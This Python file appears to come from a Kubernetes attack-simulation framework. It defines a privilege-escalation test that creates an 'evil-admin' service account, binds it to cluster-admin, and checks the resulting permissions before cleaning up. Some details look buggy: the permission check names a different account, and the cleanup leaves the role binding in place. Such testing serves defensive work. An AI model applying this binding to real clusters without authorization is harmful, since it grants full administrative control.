from testing.testing import Testing
import time

class ClusterAdminBinding(Testing):
    def __init__(self):
        super().__init__()
        self.name = "Cluster-admin binding"
        self.mitre_tactic = "TA0004"
        self.mitre_technique = "T1078.003"
        self.microsoft_technique = "MS-TA9019"
        self.pod = """apiVersion: v1
kind: ServiceAccount
metadata:
  name: evil-admin
  namespace: default
---
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: evil-admin-binding
  namespace: default
subjects:
  - kind: ServiceAccount
    name: evil-admin
    namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
"""

    def run_attack(self):
        if self.check_install_kubectl():   
            
                # Creating Service Account and Role Binding
                print("# Creating Service Account 'evil-admin' and Role Binding 'cluster-admin'...")
                self.create_file("cluster-admin-binding.yaml",self.pod)
                self.kubectl_apply("cluster-admin-binding.yaml")
                time.sleep(1)
                
                # Exec into Container with bash
                print("\n# Checks permissions for 'evil-admin' service account in 'default' namespace...")
                self.cmd = ["kubectl", "auth", "can-i", "-n", "default", "--list", "--as", "system:serviceaccount:default:evil-cluster-admin"]       
                output, error = self.kubectl_run()
                print(output)

                if self.error:
                    print("An Error has occured: " + error)
                else:
                    self.output["cluster_admin_binding"] = output
                # Cleanup
                self.cleanup()

    def cleanup(self):
        # Delete Pod cluster-admin-binding
        print("\n# Deleting Service account...")
        self.kubectl_delete("evil-admin", "serviceaccounts")
        
        print("\n# Deleting bash-cmd-pod.yaml...")
        self.delete_file("cluster-admin-binding.yaml")

    def display_help(self):
        pass

    def check_prerequisites(self):
        pass

    def determine_executable_path(self):
        pass